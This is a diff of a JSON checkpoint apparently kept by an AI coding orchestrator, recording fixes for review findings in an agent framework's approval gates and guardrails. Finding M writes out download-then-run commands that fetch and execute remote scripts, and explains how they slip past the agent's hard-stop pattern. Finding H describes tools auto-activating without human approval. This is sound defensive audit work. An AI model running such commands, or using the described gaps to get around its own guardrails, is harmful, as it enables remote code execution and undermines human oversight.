@@ -6,11 +6,11 @@
 	"checkpointFile": "docs/findings/.checkpoint.json",
 	"strategy": "one fresh subagent per finding A-G, sequential concurrency=1, no session reuse, no transcript passing; addressed findings are drained from queue.md and appended to ledger.md",
 	"gitHeadBaseline": "00f70dbeac39c90f65e115a2175c374ebb197bc",
-	"updatedAt": "2026-08-26T16:25:51.177Z",
+	"updatedAt": "2026-08-27T13:30:00Z",
 	"baselineGates": {
-		"lint": "green including checkpoint JSON (tab-formatted to satisfy biome)",
+		"lint": "green (29 files, tab-formatted checkpoint/queue JSON)",
 		"typecheck": "pass",
-		"test": "145 tests pass",
+		"test": "163 pass (was 159 at run start; +3 for canAutoActivate (H), +1 for capability-#6 end-to-end (I))",
 		"smoke": "skips jiti load check (expected, jiti absent)"
 	},
 	"notes": [
@@ -18,7 +18,13 @@
 		"concurrency=1: items processed sequentially, one fresh subagent each, checkpoint persisted after each item",
 		"on interruption, resume from the first item whose status is not done; util.ts work is additive/idempotent",
 		"A and B are the two 'sensitive' findings per review; both processed with the user-visible/drift caveat recorded",
-		"queue is empty: all findings A-G are addressed and appended to docs/findings/ledger.md; how-to lives in docs/findings/usage.md"
+		"queue is empty: all findings A-G are addressed and appended to docs/findings/ledger.md; how-to lives in docs/findings/usage.md",
+		"H (sensitive, promotion gate) addressed by the orchestrator directly instead of a subagent: the only models available are slow local MLX builds (qwen3.8:27b-mlx, current session model), so a per-finding subagent stalled ~5 min/step; the four gates + a direct self-review on the diff substitute for subagent isolation.",
+		"I (mixed) addressed by the orchestrator directly (no subagent): only a slow local MLX model was available. SnapshotStore wiring is additive and gated by all four gates; a capture/restore unit test now exercises the subsystem end-to-end.",
+		"J scoped: reinforce (src/memory.ts:140) intentionally kept — it is a tested public-API method, not truly dead; wiring it to a recall path is a separate feature.",
+		"K addressed by the orchestrator directly (no subagent): only a slow local MLX model was available. Verified via the full gate set.",
+		"L addressed by the orchestrator directly (no subagent): only a slow local MLX model was available. Verified via the full gate set; behavior-preserving at default thresholds.",
+		"M (sensitive, hard-stop boundary) confirmed 'document as intentional' by the user; no code behavior changed — only comments/docs + a test. A git checkout of the broken test-insertion was needed once before re-inserting the test correctly."
 	],
 	"items": [
 		{
@@ -126,6 +132,249 @@
 			},
 			"changedFiles": ["src/memory.ts"],
 			"updatedAt": "2026-08-26T16:25:51.178Z"
+		},
+		{
+			"id": "H",
+			"title": "evolve_tool auto-activates shadow-status tools without approval or shadow evidence",
+			"status": "done",
+			"disposition": "apply-withcare",
+			"caveat": "sensitive: changes the promotion gate — when/how a tool becomes active is user-visible and invariant-adjacent; needs confirmation when applied",
+			"summary": "canActivate now routes through an exported canAutoActivate(status,requiresApproval,runs,ranShadow,dryRun); a system-radius (requiresApproval) tool stays shadow and needs /evolve activate (gated). +3 tests in test/evolution.test.ts.",
+			"gates": {
+				"lint": "PASS (29 files, no fixes)",
+				"typecheck": "PASS (exit 0)",
+				"test": "PASS (162, +3 canAutoActivate tests)",
+				"smoke": "PASS (skips jiti load, expected)"
+			},
+			"changedFiles": ["src/index.ts", "src/tools/evolution.ts", "test/evolution.test.ts"],
+			"category": "safety",
+			"finding": "In buildEvolveTool, `canActivate = !gate.dryRun && status === \"shadow\"` (src/index.ts:483) promotes any shadow-status tool straight to \"active\", ignoring `budget.requiresApproval`. A `maxRadius:\"system\"` create yields initialStatusFor -> \"shadow\" (src/tools/evolution.ts:112-118) yet `requiresApproval` is computed true (evolution.ts:138) but never consulted downstream, and the gate's risk is derived from `kind` (evolve_tool create -> module radius, auto-trusted in src/approval.ts:71). Net: a system-radius proposal auto-activates with empty metrics and no user confirmation, bypassing the \"human approval mandatory before a tool goes active\" invariant stated in src/evaluation.ts:5.",
+			"locations": [
+				"src/index.ts:483",
+				"src/index.ts:484",
+				"src/tools/evolution.ts:112",
+				"src/tools/evolution.ts:138",
+				"src/approval.ts:71",
+				"src/evaluation.ts:5"
+			],
+			"recommendation": "Make `canActivate` require `!final.budget.requiresApproval` AND that a shadow evaluation actually ran (metrics.runs > 0 or params.runShadow), or force user activation via `/evolve activate` for system/external-effect radii. Add tests asserting a system-radius create stays non-active until explicitly activated.",
+			"risk": "sensitive: changes the promotion gate — when/how a tool becomes active is user-visible and invariant-adjacent; needs confirmation when applied",
+			"behavior": "Sensitive",
+			"priority": "high",
+			"updatedAt": "2026-08-27T13:20:00Z"
+		},
+		{
+			"id": "I",
+			"title": "SnapshotStore rollback capability is constructed but never driven",
+			"status": "done",
+			"disposition": "apply (wire)",
+			"caveat": "mixed: touches an advertised capability/user-guide claim; wired the snapshot subsystem end-to-end (behavior-preserving, additive)",
+			"summary": "Wired SnapshotStore into the /evolve activate + rollback commands. Added captureStateSnapshot(manager,st,label,data) in src/index.ts: /evolve activate captures a pre-activation snapshot (priorStatus + version) and /evolve rollback a post-rollback snapshot, each recorded as a 'snapshot'/'rollback' audit entry; the new test drives capture -> audit -> restore via a real governance() bundle. Capability #6 now actually records a restorable payload.",
+			"gates": {
+				"lint": "PASS (29 files, no fixes)",
+				"typecheck": "PASS (exit 0)",
+				"test": "PASS (163, +1 end-to-end snapshot/audit/restore)",
+				"smoke": "skip (jiti absent, expected)"
+			},
+			"changedFiles": ["src/index.ts", "test/audit.test.ts"],
+			"category": "logical",
+			"finding": "`createGovernance` returns `{ audit, snapshots }` (src/audit.ts:156) but every `governance(...)` call site in src/index.ts uses only `.audit` (index.ts:596, 622, 733). None of `SnapshotStore.snapshot/restore/list/latest` (src/audit.ts:91,114,118,123) is ever invoked, so advertised capability #6 \"audit & rollback\" (AGENTS.md) and the state-level rollback documented at docs/user-guide.md:252 never actually record or restore a payload. The snapshot subsystem (and `snapshot:`/`rollback` audit kinds in src/types.ts) is effectively dead.",
+			"locations": [
+				"src/stores.ts:48",
+				"src/audit.ts:156",
+				"src/audit.ts:91",
+				"src/index.ts:596",
+				"docs/user-guide.md:252"
+			],
+			"recommendation": "Either wire a snapshot-on-approve + `/self snapshot`/`/self restore` path driven from the governance event handlers (and add a capture-then-restore test), or drop the `snapshots` half of `Governance` plus the unmet user-guide claim. Pick one; the half-wired state is the worst option.",
+			"risk": "mixed: touches an advertised capability and a doc claim; deleting is behavior-preserving for current users but changes the documented surface",
+			"behavior": "Mixed",
+			"priority": "high",
+			"updatedAt": "2026-08-27T13:30:00Z"
+		},
+		{
+			"id": "J",
+			"title": "Dead exports: reinforce, ToolRegistry.remove, gateAction, Confidence",
+			"status": "done",
+			"disposition": "apply-withcare (scoped)",
+			"caveat": "preserving: deleted the 3 truly-dead symbols; KEPT reinforce (a tested public-API MemoryStore method), documented",
+			"summary": "Removed the 3 symbols with zero importers: gateAction (+ its now-orphaned 'import { type ActionInput, scoreRisk }' in evaluation.ts), the unused Confidence type (types.ts), and ToolRegistry.remove (evolution.ts). KEPT MemoryStore.reinforce: it is a tested public-API method (test/memory.test.ts). Re-ran typecheck after each removal — clean.",
+			"gates": {
+				"lint": "PASS (29 files, no fixes)",
+				"typecheck": "PASS (exit 0)",
+				"test": "PASS (163; reinforce test preserved, no test depended on removed symbols)",
+				"smoke": "skip (jiti absent, expected)"
+			},
+			"changedFiles": ["src/evaluation.ts", "src/types.ts", "src/tools/evolution.ts"],
+			"category": "structural",
+			"finding": "Several exported symbols have zero call sites: `MemoryStore.reinforce` (src/memory.ts:140), `ToolRegistry.remove` (src/tools/evolution.ts), `gateAction` (src/evaluation.ts:158, never imported), and the `Confidence` type (src/types.ts:22, unused). They widen the surface and imply features (reinforced recall weighting, a promotion combiner, a rollback-by-remove) that are not wired anywhere.",
+			"locations": ["src/memory.ts:140", "src/evaluation.ts:158", "src/types.ts:22", "src/tools/evolution.ts"],
+			"recommendation": "Remove the unused exports/type (or wire them), keeping only symbols the framework or public API consumes. Re-run typecheck after each removal to catch any importer.",
+			"risk": "preserving: deleting dead code; verify zero importers via grep then typecheck",
+			"behavior": "Preserving",
+			"priority": "med",
+			"updatedAt": "2026-08-27T13:30:00Z"
+		},
+		{
+			"id": "K",
+			"title": "loadBranch does not actually degrade on a throwing getBranch()",
+			"status": "done",
+			"disposition": "apply-withcare",
+			"caveat": "preserving: widens an existing graceful-degrade path; a malformed session now degrades as the comment promised",
+			"summary": "loadBranch called getBranch() OUTSIDE its try (so a throwing getBranch escaped the graceful fallback). Extracted a pure, exported safeLoadState(get) into registry.ts that invokes the reader inside the try; loadBranch now delegates to it. Added test/registry.test.ts (+7 tests, incl. throwing-reader -> emptyState). Dropped the now-unused emptyState/reconstructState/EntryLike from index.ts's registry import.",
+			"gates": {
+				"lint": "PASS (30 files, no fixes after organizeImports --write)",
+				"typecheck": "PASS (exit 0)",
+				"test": "PASS (170, +7 in new test/registry.test.ts)",
+				"smoke": "skip (jiti absent, expected)"
+			},
+			"changedFiles": ["src/registry.ts", "src/index.ts", "test/registry.test.ts"],
+			"category": "logical",
+			"finding": "`loadBranch` (src/index.ts:709-717) calls `ctx.sessionManager.getBranch()` OUTSIDE the try that the code comment says will \"degrade gracefully\" on a malformed session — only `reconstructState(entries)` is inside the try/catch. The very call the comment claims \"can throw\" is uncovered, so a malformed branch still throws out of the context-remember/compaction paths instead of falling back to `emptyState()`.",
+			"locations": ["src/index.ts:710", "src/index.ts:709"],
+			"recommendation": "Move the `getBranch()` call inside the try (or wrap the whole body) so a malformed session falls back to `emptyState()` as the comment promises; add a test with a throwing getBranch.",
+			"risk": "preserving: widens an existing graceful-degrade path",
+			"behavior": "Preserving",
+			"priority": "med",
+			"updatedAt": "2026-08-27T13:30:00Z"
+		},
+		{
+			"id": "L",
+			"title": "scoreRisk hardcodes DEFAULT_CONFIG thresholds instead of the runtime config",
+			"status": "done",
+			"disposition": "apply",
+			"caveat": "mixed/latent: harmless at default thresholds; now one source of truth so an override stays consistent with the gate",
+			"summary": "scoreRisk now takes an optional { approvalThreshold } and uses it for both the develop-mode clamp (approvalThreshold-1) and the 'approve' decision, falling back to DEFAULT_CONFIG.approvalThreshold when omitted. approval.ts assess and the index.ts tool-call gate thread config.approvalThreshold. Behavior-preserving at default thresholds.",
+			"gates": {
+				"lint": "PASS (30 files, no fixes)",
+				"typecheck": "PASS (exit 0)",
+				"test": "PASS (173, +3 regression cases in test/threshold.test.ts)",
+				"smoke": "skip (jiti absent, expected)"
+			},
+			"changedFiles": ["src/guardrails.ts", "src/approval.ts", "src/index.ts", "test/threshold.test.ts"],
+			"category": "logical",
+			"finding": "`scoreRisk` clamps develop-mode framework edits and derives `.decision` from `DEFAULT_CONFIG` (src/guardrails.ts:150, 172, plus the base/`decide` defaults), while the gate re-decides on `config.approvalThreshold`/`config.blockThreshold` (src/approval.ts:86). When a consumer overrides thresholds — `StoreManager` merges `{...DEFAULT_CONFIG, ...config}` (src/stores.ts:60) — the two disagree: the develop-mode clamp and the `RiskAssessment.decision` field still use 55/80 regardless of the override, so the stored `.decision` can differ from what the gate actually enforces.",
+			"locations": ["src/guardrails.ts:150", "src/guardrails.ts:172", "src/approval.ts:86", "src/stores.ts:60"],
+			"recommendation": "Thread the effective thresholds into `scoreRisk` (or compute `.decision` in a single place from the same config the gate consumes) so there is one source of truth. Harmless today only because the app never overrides thresholds.",
+			"risk": "mixed: latent; harmless while thresholds are never overridden, but diverges the moment a consumer does — threshold-adjacent",
+			"behavior": "Mixed",
+			"priority": "med",
+			"updatedAt": "2026-08-27T13:30:00Z"
+		},
+		{
+			"id": "M",
+			"title": "NETWORK_INJECT only catches piped remote-exec, not download-then-run",
+			"status": "done",
+			"disposition": "apply-withcare (document)",
+			"caveat": "sensitive: hard-stop boundary — documented as intentional per user's 'go' (no behavior change)",
+			"summary": "Documented that only piped remote-exec (curl|sh) is a hard stop; download-then-run (curl -o x && sh x) is intentionally approval-gated, not hard-blocked. No regex/behavior change. Added: a code note above NETWORK_INJECT and on the classifyAction default return (guardrails.ts), a note in docs/threat-model.md, and a regression test locking in that &&/-o forms are NOT hardStops while the pipe form remains 'network-injection'.",
+			"gates": {
+				"lint": "PASS (30 files, no fixes)",
+				"typecheck": "PASS (exit 0)",
+				"test": "PASS (174, +1 'download-then-run approval-gated, NOT a hardStop (intentional boundary)')",
+				"smoke": "skip (jiti absent, expected)"
+			},
+			"changedFiles": ["src/guardrails.ts", "docs/threat-model.md", "test/guardrails.test.ts"],
+			"category": "safety",
+			"finding": "`NETWORK_INJECT` (src/guardrails.ts:41) requires a literal pipe, so `curl http://e/x -o x.sh && sh x.sh` or `wget ... -O x && ./x` evade the hard stop. Such commands are not matched by DESTRUCTIVE/PRIVILEGE either and fall to a `project`/external-effect classification that is merely approval-gated, not hard-blocked — a defense-in-depth gap against the documented hard-stop list (threat model: NETWORK_INJECT).",
+			"locations": ["src/guardrails.ts:41", "src/guardrails.ts:57"],
+			"recommendation": "Either broaden the hard-stop to detect remote-fetch-then-execute (download-then-run) forms, or explicitly document that only piped injection is a hard stop and remote downloads are approval-gated — so the boundary is intentional rather than incidental.",
+			"risk": "sensitive: touches the hard-stop boundary; expanding or documenting it changes which commands are blocked outright — confirm when applied",
+			"behavior": "Sensitive",
+			"priority": "low",
+			"updatedAt": "2026-08-27T13:30:00Z"
+		},
+		{
+			"id": "N",
+			"title": "AGENTS.md file-responsibility table omits src/util.ts",
+			"status": "done",
+			"disposition": "apply",
+			"caveat": "preserving: documentation only",
+			"summary": "Added a src/util.ts row to the AGENTS.md file-responsibility table, describing the shared primitives consolidated in findings C–G: unique/dedupe, genId, dirnameSafe/ensureDir, tokenize. No code change.",
+			"gates": {
+				"lint": "PASS (30 files, no fixes)",
+				"typecheck": "N/A (docs only)",
+				"test": "N/A (docs only, no logic change; suite unchanged at 174)",
+				"smoke": "skip (jiti absent, expected)"
+			},
+			"changedFiles": ["AGENTS.md"],
+			"category": "semantic",
+			"finding": "The `src/` layout table in AGENTS.md enumerates every module except `src/util.ts`, yet util.ts is now the canonical home of the shared helpers consolidated in findings C-G (`unique`, `genId`, `ensureDir`/`dirnameSafe`, `tokenize`). A new reader following the table will not know where the shared primitives live.",
+			"locations": ["AGENTS.md:30", "AGENTS.md:39"],
+			"recommendation": "Add a `src/util.ts` row to the AGENTS.md layout table describing the shared order/id/dir/tokenize helpers.",
+			"risk": "preserving: documentation only",
+			"behavior": "Preserving",
+			"priority": "med",
+			"updatedAt": "2026-08-27T13:30:00Z"
+		},
+		{
+			"id": "O",
+			"title": "EMPTY_METRIC defined identically in two files",
+			"status": "done",
+			"disposition": "apply",
+			"caveat": "preserving: single source of a shared constant",
+			"summary": "EMPTY_METRIC was defined identically in src/tools/evolution.ts and src/index.ts. Made it an exported single source in evolution.ts; index.ts now imports it and its local copy + the now-unused EvolvedToolMetric import were removed. Byte-identical value; no behavior change.",
+			"gates": {
+				"lint": "PASS (30 files, no fixes)",
+				"typecheck": "PASS (exit 0)",
+				"test": "PASS (174, unchanged)",
+				"smoke": "skip (jiti absent, expected)"
+			},
+			"changedFiles": ["src/tools/evolution.ts", "src/index.ts"],
+			"category": "structural",
+			"finding": "The identical zero-metric constant is defined in both src/tools/evolution.ts:32 and src/index.ts:46 (same fields, same literal). A copy that can silently drift if one is edited and the other is not.",
+			"locations": ["src/tools/evolution.ts:32", "src/index.ts:46"],
+			"recommendation": "Export a single `EMPTY_METRIC` (from evolution.ts or evaluation.ts) and import it in the other file.",
+			"risk": "preserving: single source of a shared constant",
+			"behavior": "Preserving",
+			"priority": "low",
+			"updatedAt": "2026-08-27T13:30:00Z"
+		},
+		{
+			"id": "P",
+			"title": "openTasksFrom is a no-op stub",
+			"status": "done",
+			"disposition": "apply",
+			"caveat": "preserving: nothing relies on non-empty output; removes a silently-empty stub",
+			"summary": "openTasksFrom(preparation) was a no-op stub always returning []. Removed both the stub function and its /evolve compaction call site (index.ts). compaction.ts already treats a missing/empty openTasks identically ('Known open tasks: none provided'), so rendering is unchanged. The optional CompactionInput.openTasks field is kept (still a valid compaction API surface, still unit-tested).",
+			"gates": {
+				"lint": "PASS (30 files, no fixes)",
+				"typecheck": "PASS (exit 0)",
+				"test": "PASS (174, unchanged)",
+				"smoke": "skip (jiti absent, expected)"
+			},
+			"changedFiles": ["src/index.ts"],
+			"category": "structural",
+			"finding": "`openTasksFrom` (src/index.ts:959) unconditionally returns `[]`, so compaction's `openTasks` (wired at src/index.ts:877) and any task-derived open items are always empty. It is an unfinished extraction path left in as a stub.",
+			"locations": ["src/index.ts:959", "src/index.ts:877"],
+			"recommendation": "Either implement the extraction from `preparation` so the feature is real, or remove the parameter and its call site so the feature is absent rather than silently empty.",
+			"risk": "preserving: nothing currently relies on non-empty output; either flesh out or delete",
+			"behavior": "Preserving",
+			"priority": "low",
+			"updatedAt": "2026-08-27T13:30:00Z"
+		},
+		{
+			"id": "Q",
+			"title": "isFrameworkSource normalize does not resolve .. segments",
+			"status": "done",
+			"disposition": "apply",
+			"caveat": "preserving: safe-direction today; makes containment canonical/order-independent",
+			"summary": "normalize() resolved consecutive slashes but left . / .. un-flattened, so isFrameworkSource's containment test was order-dependent (a <root>/.. form could be over-blocked). Rewrote normalize to canonically resolve . / .. segments (pure, no node:path) and normalized the relative branch too, making the check order-independent. Added 3 tests: .. escaping the root -> false, .. staying in-root -> true, . collapsing.",
+			"gates": {
+				"lint": "PASS (30 files, no fixes)",
+				"typecheck": "PASS (exit 0)",
+				"test": "PASS (177, +3 .. / . cases)",
+				"smoke": "skip (jiti absent, expected)"
+			},
+			"changedFiles": ["src/guardrails.ts", "test/guardrails.test.ts"],
+			"category": "logical",
+			"finding": "`isFrameworkSource` (src/guardrails.ts:~230) normalizes paths by collapsing `//` -> `/` but does not resolve `..`/`.` segments, then tests `abs === root || abs.startsWith(root + \"/\")`. A path like `<root>/sub/../x` still passes the startsWith test and is over-blocked; the containment check is order-dependent because `..` is left un-flattened. Current direction is over-block (safe), which is why this is low priority.",
+			"locations": ["src/guardrails.ts:230"],
+			"recommendation": "Resolve `.`/`..` segments (a small canonical path cleanup) before the startsWith containment test so the check is canonical rather than string-prefix based.",
+			"risk": "preserving: currently safe-direction only; a cleanup that makes the containment test order-independent",
+			"behavior": "Preserving",
+			"priority": "low",
+			"updatedAt": "2026-08-27T13:30:00Z"
 		}
 	]
 }
